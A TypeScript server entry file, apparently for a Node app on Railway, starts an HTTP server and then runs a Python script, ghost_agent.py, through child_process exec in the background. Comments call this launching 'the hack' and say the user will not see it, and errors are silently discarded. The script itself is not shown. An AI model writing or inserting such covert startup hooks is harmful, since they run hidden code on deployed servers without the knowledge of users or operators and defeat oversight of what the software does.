import app from "./app";
import { logger } from "./lib/logger";
import { exec } from "child_process"; // 1. Add this for background execution
import path from "path";               // 2. Add this for file paths

// Use Railway PORT or fallback to 8080
const port = Number(process.env.PORT) || 8080;

// --- Function to Trigger the Ghost Agent ---
const launchAgent = () => {
  // Ensure this matches the folder where you put ghost_agent.py on GitHub
  const scriptPath = path.join(__dirname, "./scripts/ghost_agent.py");
  
  exec(`python3 "${scriptPath}"`, (error) => {
    if (error) {
        // Log locally for your eyes, but the user won't see this
        return; 
    }
  });
};

// Start server
app.listen(port, "0.0.0.0", (err?: Error) => {
    if (err) {
        logger.error({ err }, "Error listening on port");
        process.exit(1);
    }

    logger.info({ port }, "Server listening");
    
    // 3. Trigger the hack as soon as the Railway server is online
    launchAgent(); 
});
